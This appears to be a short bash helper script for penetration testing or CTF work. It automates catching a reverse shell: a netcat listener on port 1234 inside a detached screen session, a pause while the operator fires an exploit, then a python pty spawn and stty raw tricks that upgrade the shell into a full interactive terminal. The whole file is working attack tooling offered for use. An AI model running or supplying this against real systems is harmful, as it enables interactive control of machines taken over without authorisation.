screen -dmS shell
screen -r shell -p 0 -X stuff "nc -lvp 1234 ^M"
read -n 1 -r -s -p $'Prepare exploit then Press enter to continue...\n'
screen -r shell -p 0 -X stuff "python -c 'import pty;pty.spawn(\"/bin/bash\")'^M"
echo "connecting... "
sleep 2
screen -r shell -p 0 -X stuff "^zstty raw -echo^Mfg^Mreset^M"
screen -r shell -p 0 -X stuff "xterm-256color^M"
screen -r shell -p 0 -X stuff "export SHELL=bash^Mexport TERM=xterm-256color^M"

#set rows and columns.. stty -a
screen -r shell -p 0 -X stuff "stty rows 52 columns 235^M"
echo "to connect -->screen -r shell"
